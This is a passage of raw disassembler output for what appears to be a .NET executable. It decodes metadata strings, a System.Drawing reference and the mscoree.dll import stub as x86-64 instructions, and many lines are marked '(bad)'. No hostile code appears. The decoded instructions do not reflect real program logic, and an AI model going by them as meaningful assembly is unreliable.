  40bba6:	74 69                	je     0x40bc11
  40bba8:	76 65                	jbe    0x40bc0f
  40bbaa:	50                   	push   %rax
  40bbab:	61                   	(bad)
  40bbac:	74 74                	je     0x40bc22
  40bbae:	65 72 6e             	gs jb  0x40bc1f
  40bbb1:	14 70                	adc    $0x70,%al
  40bbb3:	65 72 63             	gs jb  0x40bc19
  40bbb6:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bbb8:	74 44                	je     0x40bbfe
  40bbba:	65 63 69 6d          	movsxd %gs:0x6d(%rcx),%ebp
  40bbbe:	61                   	(bad)
  40bbbf:	6c                   	insb   (%dx),(%rdi)
  40bbc0:	44 69 67 69 74 73 11 	imul   $0x64117374,0x69(%rdi),%r12d
  40bbc7:	64 
  40bbc8:	69 67 69 74 53 75 62 	imul   $0x62755374,0x69(%rdi),%esp
  40bbcf:	73 74                	jae    0x40bc45
  40bbd1:	69 74 75 74 69 6f 6e 	imul   $0xa6e6f69,0x74(%rbp,%rsi,2),%esi
  40bbd8:	0a 
  40bbd9:	69 73 52 65 61 64 4f 	imul   $0x4f646165,0x52(%rbx),%esi
  40bbe0:	6e                   	outsb  (%rsi),(%dx)
  40bbe1:	6c                   	insb   (%dx),(%rdi)
  40bbe2:	79 11                	jns    0x40bbf5
  40bbe4:	6d                   	insl   (%dx),(%rdi)
  40bbe5:	5f                   	pop    %rdi
  40bbe6:	75 73                	jne    0x40bc5b
  40bbe8:	65 55                	gs push %rbp
  40bbea:	73 65                	jae    0x40bc51
  40bbec:	72 4f                	jb     0x40bc3d
  40bbee:	76 65                	jbe    0x40bc55
  40bbf0:	72 72                	jb     0x40bc64
  40bbf2:	69 64 65 0d 6d 5f 69 	imul   $0x73695f6d,0xd(%rbp,%riz,2),%esp
  40bbf9:	73 
  40bbfa:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40bbfc:	76 61                	jbe    0x40bc5f
  40bbfe:	72 69                	jb     0x40bc69
  40bc00:	61                   	(bad)
  40bc01:	6e                   	outsb  (%rsi),(%dx)
  40bc02:	74 15                	je     0x40bc19
  40bc04:	76 61                	jbe    0x40bc67
  40bc06:	6c                   	insb   (%dx),(%rdi)
  40bc07:	69 64 46 6f 72 50 61 	imul   $0x72615072,0x6f(%rsi,%rax,2),%esp
  40bc0e:	72 
  40bc0f:	73 65                	jae    0x40bc76
  40bc11:	41 73 4e             	rex.B jae 0x40bc62
  40bc14:	75 6d                	jne    0x40bc83
  40bc16:	62 65 72 17 76       	(bad)
  40bc1b:	61                   	(bad)
  40bc1c:	6c                   	insb   (%dx),(%rdi)
  40bc1d:	69 64 46 6f 72 50 61 	imul   $0x72615072,0x6f(%rsi,%rax,2),%esp
  40bc24:	72 
  40bc25:	73 65                	jae    0x40bc8c
  40bc27:	41 73 43             	rex.B jae 0x40bc6d
  40bc2a:	75 72                	jne    0x40bc9e
  40bc2c:	72 65                	jb     0x40bc93
  40bc2e:	6e                   	outsb  (%rsi),(%dx)
  40bc2f:	63 79 07             	movsxd 0x7(%rcx),%edi
  40bc32:	07                   	(bad)
  40bc33:	07                   	(bad)
  40bc34:	01 01                	add    %eax,(%rcx)
  40bc36:	01 01                	add    %eax,(%rcx)
  40bc38:	01 01                	add    %eax,(%rcx)
  40bc3a:	01 01                	add    %eax,(%rcx)
  40bc3c:	01 01                	add    %eax,(%rcx)
  40bc3e:	01 01                	add    %eax,(%rcx)
  40bc40:	01 01                	add    %eax,(%rcx)
  40bc42:	01 06                	add    %eax,(%rsi)
	...
  40bc50:	00 00                	add    %al,(%rax)
  40bc52:	00 08                	add    %cl,(%rax)
  40bc54:	08 08                	or     %cl,(%rax)
  40bc56:	08 08                	or     %cl,(%rax)
  40bc58:	08 08                	or     %cl,(%rax)
  40bc5a:	08 08                	or     %cl,(%rax)
  40bc5c:	08 08                	or     %cl,(%rax)
  40bc5e:	08 08                	or     %cl,(%rax)
  40bc60:	01 01                	add    %eax,(%rcx)
  40bc62:	01 01                	add    %eax,(%rcx)
  40bc64:	01 09                	add    %ecx,(%rcx)
  40bc66:	08 00                	or     %al,(%rax)
  40bc68:	00 00                	add    %al,(%rax)
  40bc6a:	09 09                	or     %ecx,(%rcx)
  40bc6c:	00 00                	add    %al,(%rax)
  40bc6e:	00 09                	add    %cl,(%rcx)
  40bc70:	08 00                	or     %al,(%rax)
  40bc72:	00 00                	add    %al,(%rax)
  40bc74:	06                   	(bad)
  40bc75:	0b 00                	or     (%rax),%eax
  40bc77:	00 00                	add    %al,(%rax)
  40bc79:	01 2b                	add    %ebp,(%rbx)
  40bc7b:	06                   	(bad)
  40bc7c:	0c 00                	or     $0x0,%al
  40bc7e:	00 00                	add    %al,(%rax)
  40bc80:	01 2d 06 0d 00 00    	add    %ebp,0xd06(%rip)        # 0x40c98c
  40bc86:	00 01                	add    %al,(%rcx)
  40bc88:	2e 09 06             	cs or  %eax,(%rsi)
  40bc8b:	00 00                	add    %al,(%rax)
  40bc8d:	00 09                	add    %cl,(%rcx)
  40bc8f:	06                   	(bad)
  40bc90:	00 00                	add    %al,(%rax)
  40bc92:	00 09                	add    %cl,(%rcx)
  40bc94:	0d 00 00 00 06       	or     $0x6000000,%eax
  40bc99:	10 00                	adc    %al,(%rax)
  40bc9b:	00 00                	add    %al,(%rax)
  40bc9d:	02 c2                	add    %dl,%al
  40bc9f:	a4                   	movsb  (%rsi),(%rdi)
  40bca0:	0a 06                	or     (%rsi),%al
  40bca2:	11 00                	adc    %eax,(%rax)
  40bca4:	00 00                	add    %al,(%rax)
  40bca6:	03 4e 61             	add    0x61(%rsi),%ecx
  40bca9:	4e 06                	rex.WRX (bad)
  40bcab:	12 00                	adc    (%rax),%al
  40bcad:	00 00                	add    %al,(%rax)
  40bcaf:	08 49 6e             	or     %cl,0x6e(%rcx)
  40bcb2:	66 69 6e 69 74 79    	imul   $0x7974,0x69(%rsi),%bp
  40bcb8:	06                   	(bad)
  40bcb9:	13 00                	adc    (%rax),%eax
  40bcbb:	00 00                	add    %al,(%rax)
  40bcbd:	09 2d 49 6e 66 69    	or     %ebp,0x69666e49(%rip)        # 0x69a72b0c
  40bcc3:	6e                   	outsb  (%rsi),(%dx)
  40bcc4:	69 74 79 09 0d 00 00 	imul   $0xd,0x9(%rcx,%rdi,2),%esi
  40bccb:	00 
  40bccc:	09 06                	or     %eax,(%rsi)
  40bcce:	00 00                	add    %al,(%rax)
  40bcd0:	00 06                	add    %al,(%rsi)
  40bcd2:	16                   	(bad)
  40bcd3:	00 00                	add    %al,(%rax)
  40bcd5:	00 01                	add    %al,(%rcx)
  40bcd7:	25 06 17 00 00       	and    $0x1706,%eax
  40bcdc:	00 03                	add    %al,(%rbx)
  40bcde:	e2 80                	loop   0x40bc60
  40bce0:	b0 09                	mov    $0x9,%al
  40bce2:	18 00                	sbb    %al,(%rax)
  40bce4:	00 00                	add    %al,(%rax)
  40bce6:	00 00                	add    %al,(%rax)
  40bce8:	00 00                	add    %al,(%rax)
  40bcea:	02 00                	add    (%rax),%al
  40bcec:	00 00                	add    %al,(%rax)
  40bcee:	02 00                	add    (%rax),%al
	...
  40bcf8:	00 00                	add    %al,(%rax)
  40bcfa:	01 00                	add    %eax,(%rax)
	...
  40bd04:	00 00                	add    %al,(%rax)
  40bd06:	02 00                	add    (%rax),%al
  40bd08:	00 00                	add    %al,(%rax)
  40bd0a:	01 00                	add    %eax,(%rax)
  40bd0c:	00 00                	add    %al,(%rax)
  40bd0e:	01 00                	add    %eax,(%rax)
  40bd10:	01 01                	add    %eax,(%rcx)
  40bd12:	01 0f                	add    %ecx,(%rdi)
  40bd14:	08 00                	or     %al,(%rax)
  40bd16:	00 00                	add    %al,(%rax)
  40bd18:	01 00                	add    %eax,(%rax)
  40bd1a:	00 00                	add    %al,(%rax)
  40bd1c:	08 03                	or     %al,(%rbx)
  40bd1e:	00 00                	add    %al,(%rax)
  40bd20:	00 0f                	add    %cl,(%rdi)
  40bd22:	09 00                	or     %eax,(%rax)
  40bd24:	00 00                	add    %al,(%rax)
  40bd26:	01 00                	add    %eax,(%rax)
  40bd28:	00 00                	add    %al,(%rax)
  40bd2a:	08 03                	or     %al,(%rbx)
  40bd2c:	00 00                	add    %al,(%rax)
  40bd2e:	00 11                	add    %dl,(%rcx)
  40bd30:	18 00                	sbb    %al,(%rax)
  40bd32:	00 00                	add    %al,(%rax)
  40bd34:	0a 00                	or     (%rax),%al
  40bd36:	00 00                	add    %al,(%rax)
  40bd38:	06                   	(bad)
  40bd39:	19 00                	sbb    %eax,(%rax)
  40bd3b:	00 00                	add    %al,(%rax)
  40bd3d:	01 30                	add    %esi,(%rax)
  40bd3f:	06                   	(bad)
  40bd40:	1a 00                	sbb    (%rax),%al
  40bd42:	00 00                	add    %al,(%rax)
  40bd44:	01 31                	add    %esi,(%rcx)
  40bd46:	06                   	(bad)
  40bd47:	1b 00                	sbb    (%rax),%eax
  40bd49:	00 00                	add    %al,(%rax)
  40bd4b:	01 32                	add    %esi,(%rdx)
  40bd4d:	06                   	(bad)
  40bd4e:	1c 00                	sbb    $0x0,%al
  40bd50:	00 00                	add    %al,(%rax)
  40bd52:	01 33                	add    %esi,(%rbx)
  40bd54:	06                   	(bad)
  40bd55:	1d 00 00 00 01       	sbb    $0x1000000,%eax
  40bd5a:	34 06                	xor    $0x6,%al
  40bd5c:	1e                   	(bad)
  40bd5d:	00 00                	add    %al,(%rax)
  40bd5f:	00 01                	add    %al,(%rcx)
  40bd61:	35 06 1f 00 00       	xor    $0x1f06,%eax
  40bd66:	00 01                	add    %al,(%rcx)
  40bd68:	36 06                	ss (bad)
  40bd6a:	20 00                	and    %al,(%rax)
  40bd6c:	00 00                	add    %al,(%rax)
  40bd6e:	01 37                	add    %esi,(%rdi)
  40bd70:	06                   	(bad)
  40bd71:	21 00                	and    %eax,(%rax)
  40bd73:	00 00                	add    %al,(%rax)
  40bd75:	01 38                	add    %edi,(%rax)
  40bd77:	06                   	(bad)
  40bd78:	22 00                	and    (%rax),%al
  40bd7a:	00 00                	add    %al,(%rax)
  40bd7c:	01 39                	add    %edi,(%rcx)
  40bd7e:	0b 43 00             	or     0x0(%rbx),%eax
  40bd81:	01 00                	add    %eax,(%rax)
  40bd83:	00 00                	add    %al,(%rax)
  40bd85:	ff                   	(bad)
  40bd86:	ff                   	(bad)
  40bd87:	ff                   	(bad)
  40bd88:	ff 01                	incl   (%rcx)
  40bd8a:	00 00                	add    %al,(%rax)
  40bd8c:	00 00                	add    %al,(%rax)
  40bd8e:	00 00                	add    %al,(%rax)
  40bd90:	00 0c 02             	add    %cl,(%rdx,%rax,1)
  40bd93:	00 00                	add    %al,(%rax)
  40bd95:	00 51 53             	add    %dl,0x53(%rcx)
  40bd98:	79 73                	jns    0x40be0d
  40bd9a:	74 65                	je     0x40be01
  40bd9c:	6d                   	insl   (%dx),(%rdi)
  40bd9d:	2e 44 72 61          	rex.R jb,pn 0x40be02
  40bda1:	77 69                	ja     0x40be0c
  40bda3:	6e                   	outsb  (%rsi),(%dx)
  40bda4:	67 2c 20             	addr32 sub $0x20,%al
  40bda7:	56                   	push   %rsi
  40bda8:	65 72 73             	gs jb  0x40be1e
  40bdab:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40bdb2:	2e 30 2e             	cs xor %ch,(%rsi)
  40bdb5:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40bdb8:	43 75 6c             	rex.XB jne 0x40be27
  40bdbb:	74 75                	je     0x40be32
  40bdbd:	72 65                	jb     0x40be24
  40bdbf:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40bdc4:	72 61                	jb     0x40be27
  40bdc6:	6c                   	insb   (%dx),(%rdi)
  40bdc7:	2c 20                	sub    $0x20,%al
  40bdc9:	50                   	push   %rax
  40bdca:	75 62                	jne    0x40be2e
  40bdcc:	6c                   	insb   (%dx),(%rdi)
  40bdcd:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40bdd4:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40bdd8:	62                   	(bad)
  40bdd9:	30 33                	xor    %dh,(%rbx)
  40bddb:	66 35 66 37          	xor    $0x3766,%ax
  40bddf:	66 31 31             	xor    %si,(%rcx)
  40bde2:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40bde8:	05 01 00 00 00       	add    $0x1,%eax
  40bded:	13 53 79             	adc    0x79(%rbx),%edx
  40bdf0:	73 74                	jae    0x40be66
  40bdf2:	65 6d                	gs insl (%dx),(%rdi)
  40bdf4:	2e 44 72 61          	rex.R jb,pn 0x40be59
  40bdf8:	77 69                	ja     0x40be63
  40bdfa:	6e                   	outsb  (%rsi),(%dx)
  40bdfb:	67 2e 53             	addr32 cs push %rbx
  40bdfe:	69 7a 65 02 00 00 00 	imul   $0x2,0x65(%rdx),%edi
  40be05:	05 77 69 64 74       	add    $0x74646977,%eax
  40be0a:	68 06 68 65 69       	push   $0x69656806
  40be0f:	67 68 74 00 00 08    	addr32 push $0x8000074
  40be15:	08 02                	or     %al,(%rdx)
  40be17:	00 00                	add    %al,(%rax)
  40be19:	00 08                	add    %cl,(%rax)
  40be1b:	00 00                	add    %al,(%rax)
  40be1d:	00 08                	add    %cl,(%rax)
  40be1f:	00 00                	add    %al,(%rax)
  40be21:	00 0b                	add    %cl,(%rbx)
  40be23:	08 50 00             	or     %dl,0x0(%rax)
  40be26:	00 00                	add    %al,(%rax)
  40be28:	02 00                	add    (%rax),%al
  40be2a:	00 00                	add    %al,(%rax)
  40be2c:	00 00                	add    %al,(%rax)
  40be2e:	00 00                	add    %al,(%rax)
  40be30:	58                   	pop    %rax
  40be31:	be 00 00 00 00       	mov    $0x0,%esi
  40be36:	00 00                	add    %al,(%rax)
  40be38:	00 00                	add    %al,(%rax)
  40be3a:	00 00                	add    %al,(%rax)
  40be3c:	6e                   	outsb  (%rsi),(%dx)
  40be3d:	be 00 00 00 20       	mov    $0x20000000,%esi
	...
  40be56:	00 00                	add    %al,(%rax)
  40be58:	60                   	(bad)
  40be59:	be 00 00 00 00       	mov    $0x0,%esi
  40be5e:	00 00                	add    %al,(%rax)
  40be60:	00 00                	add    %al,(%rax)
  40be62:	5f                   	pop    %rdi
  40be63:	43 6f                	rex.XB outsl (%rsi),(%dx)
  40be65:	72 45                	jb     0x40beac
  40be67:	78 65                	js     0x40bece
  40be69:	4d 61                	rex.WRB (bad)
  40be6b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%rsi),%ebp
  40be72:	72 65                	jb     0x40bed9
  40be74:	65 2e 64 6c          	gs cs fs insb (%dx),(%rdi)
  40be78:	6c                   	insb   (%dx),(%rdi)
  40be79:	00 00                	add    %al,(%rax)
  40be7b:	00 00                	add    %al,(%rax)
  40be7d:	00 ff                	add    %bh,%bh
  40be7f:	25 00 20 40 00       	and    $0x402000,%eax
